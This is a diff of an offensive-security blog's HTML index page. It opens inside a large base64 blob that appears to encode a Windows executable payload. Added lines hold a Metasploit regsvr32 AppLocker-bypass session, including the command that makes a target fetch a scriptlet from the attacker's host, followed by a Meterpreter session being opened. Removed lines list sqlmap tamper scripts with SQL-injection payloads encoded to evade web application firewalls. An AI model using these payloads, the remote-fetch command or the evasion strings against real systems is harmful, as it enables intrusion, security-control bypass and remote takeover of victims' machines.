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</span><br></pre></td></tr></table></figure>
+<hr>
+<p>###0x04 Metasploit regsvr32_applocker_bypass_server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set SRVPORT 8282</span><br><span class="line">SRVPORT =&gt; 8282</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:4444</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0</span><br><span class="line">[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; sessions -i 1</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/14/Web-Delivery-with-Metasploit/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1656,402 +1783,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/05/SQLMAP-Tamper/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/05/SQLMAP-Tamper/" itemprop="url">
-                  SQLMAP Tamper
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-05T15:10:42+08:00">
-                2016-09-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3><p><strong>Function: 用utf8编码引号</strong></p>
-<p><strong>Platform:All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</span><br></pre></td></tr></table></figure>
-<h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3><p><strong>Function: ‘ ==&gt; %00%27</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %00%271%00%27=%00%271</span><br></pre></td></tr></table></figure>
-<h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3><p><strong>Function: 空格 ==&gt; %00</strong></p>
-<p><strong>Platform: Microsoft Access</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1%00</span><br></pre></td></tr></table></figure>
-<h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3><p><strong>Function: base64 encode</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span><br></pre></td></tr></table></figure>
-<h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3><p><strong>Function: &gt; ==&gt; NOT BETWEEN 0 AND</strong></p>
-<p><strong>Platform: Mssql2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B-- ==&gt; 1 AND A NOT BETWEEN 0 AND B--```、```1 AND A = B-- ==&gt; 1 AND A BETWEEN B AND B--</span><br></pre></td></tr></table></figure>
-<h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3><p><strong>Function: 空格 ==&gt; %09</strong></p>
-<p><strong>Platform: MySQL 5.1, SGOS</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE id = 1 ==&gt; SELECT%09id FROM%09users WHERE%09id LIKE 1</span><br></pre></td></tr></table></figure>
-<h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3><p><strong>Function: 双url编码</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>
-<h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3><p><strong>Function: url编码</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>
-<h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3><p><strong>Function: escape编码</strong></p>
-<p><strong>Platform: Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>
-<h3 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h3><p><strong>Function: limit 2,3 ==&gt; LIMIT 3 OFFSET 2</strong></p>
-<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 2, 3 ==&gt; LIMIT 3 OFFSET 2</span><br></pre></td></tr></table></figure>
-<h3 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h3><p><strong>Function: MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</strong></p>
-<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</span><br></pre></td></tr></table></figure>
-<h3 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h3><p><strong>Function: CONCAT() ==&gt; CONCAT_WS()</strong></p>
-<p><strong>Platform: MySQL 5.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</span><br></pre></td></tr></table></figure>
-<h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3><p><strong>Function: ＝ ==&gt; like</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>
-<h3 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h3><p><strong>Function: ‘ ==&gt; \‘、” ==&gt; \“</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; AND SLEEP(5)# ==&gt; 1\\\\&quot; AND SLEEP(5)#</span><br></pre></td></tr></table></figure>
-<h3 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h3><p><strong>Function: &gt; ==&gt; GREATEST</strong></p>
-<p><strong>Platform: MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B ==&gt; 1 AND GREATEST(A,B+1)=A</span><br></pre></td></tr></table></figure>
-<h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3><p><strong>Function: 空格 ==&gt; /*!0</strong></p>
-<p><strong>Platform: MySQL 4.0.18, 5.0.22</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ==&gt; /*!0union</span><br></pre></td></tr></table></figure>
-<h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3><p><strong>Function: IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)</strong></p>
-<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure>
-<h3 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
-<p><strong>Platform: MySQL</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES</span><br></pre></td></tr></table></figure>
-<h3 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h3><p><strong>Function: INSERT ==&gt; insert</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</span><br></pre></td></tr></table></figure>
-<h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3><p><strong>Function: AND ==&gt; /<em>!12345AND</em>/</strong></p>
-<p><strong>Platform: MySQL 5.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1-- ==&gt; 1 /*!30874AND 2&gt;1*/--</span><br></pre></td></tr></table></figure>
-<h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3><p><strong>Function: 空格 ==&gt; 多个空格</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar ==&gt; 1    UNION     SELECT   foobar</span><br></pre></td></tr></table></figure>
-<h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3><p><strong>Function: union ==&gt; uniunionon</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT 2-- ==&gt; 1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure>
-<h3 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h3><p><strong>Function: unicode编码</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</span><br></pre></td></tr></table></figure>
-<h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3><p><strong>Function: select ==&gt; s%e%l%e%c%t</strong></p>
-<p><strong>Platform: Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>
-<h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3><p><strong>Function: INSERT ==&gt; INseRt</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; InseRt</span><br></pre></td></tr></table></figure>
-<h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3><p><strong>Function: INSERT ==&gt; I/**/N/**/SERT</strong></p>
-<p><strong>Platform: Mysql</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; I/**/N/**/SERT</span><br></pre></td></tr></table></figure>
-<h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3><p><strong>Function: 1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3><p><strong>Function: 空格 ==&gt;  sp_password</strong></p>
-<p><strong>Platform: Mssql</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--  ==&gt; 1 AND 9227=9227-- sp_password</span><br></pre></td></tr></table></figure>
-<h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT/**/id/**/FROM/**/users</span><br></pre></td></tr></table></figure>
-<h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3><p><strong>Function: 空格 ==&gt; –nVNaVoPYeva%0A</strong></p>
-<p><strong>Platform:MSSQL、SQLite</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
-<h3 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h3><p><strong>Function: 空格 ==&gt; %23nVNaVoPYeva%0A</strong></p>
-<p><strong>Platform: MySQL 4.0, 5.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
-<h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3><p><strong>Function: 空格 ==&gt; %23ngNvzqu%0A</strong></p>
-<p><strong>Platform: MySQL 5.1.41</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</span><br></pre></td></tr></table></figure>
